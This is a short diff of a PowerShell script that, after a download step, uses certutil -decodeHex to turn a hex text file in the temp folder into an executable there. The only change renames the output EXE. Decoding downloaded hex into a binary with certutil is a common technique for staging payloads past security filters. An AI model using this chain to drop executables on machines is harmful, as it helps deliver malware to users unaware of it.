@@ -12,7 +12,7 @@ Write-Host "File downloaded to: $tempPath"
 
 # Define paths for input and output
 $hexFilePath = "$env:TEMP\example.txt"  # Path to your hex file in TEMP
-$outputExePath = "$env:TEMP\output2.exe"  # Path for the output EXE file
+$outputExePath = "$env:TEMP\example.exe"  # Path for the output EXE file
 
 # Use certutil to convert hex to binary
 certutil -f -decodeHex $hexFilePath $outputExePath
